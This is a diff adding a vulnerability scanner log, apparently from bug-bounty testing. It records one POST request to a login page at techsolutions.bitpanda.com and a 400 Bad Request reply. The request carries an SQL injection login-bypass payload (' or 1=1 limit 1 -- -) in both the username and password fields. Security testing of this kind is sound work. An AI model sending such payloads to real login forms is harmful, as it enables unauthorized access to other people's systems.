@@ -1,0 +1,25 @@
+[indonasia-toko-cms-sql] Dumped HTTP request for https://techsolutions.bitpanda.com/index.php?mnu=login
+
+
+POST /index.php?mnu=login HTTP/1.1
+Host: techsolutions.bitpanda.com
+User-Agent: Mozilla/5.0 (Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Safari/107.0 Safari/537.36
+Connection: close
+Content-Length: 79
+Content-Type: application/x-www-form-urlencoded
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+Accept-Encoding: gzip
+
+user=%27+or+1%3D1+limit+1+--+-%2B&pass=%27+or+1%3D1+limit+1+--+-%2B&Login=Login
+[indonasia-toko-cms-sql] Dumped HTTP response https://techsolutions.bitpanda.com/index.php?mnu=login
+
+HTTP/1.1 400 Bad Request
+Connection: close
+Content-Length: 11
+Date: Tue, 05 Aug 2025 12:53:24 GMT
+Via: 1.1 e96ed109dde78412c6b4651755281804.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: EXS52H_Wtc-RhPm242XodBXPOzVauFLeDy8XnfQjbsNePAfEeJPOJQ==
+X-Amz-Cf-Pop: IAD55-P8
+X-Cache: LambdaGeneratedResponse from cloudfront
+
+Bad Request
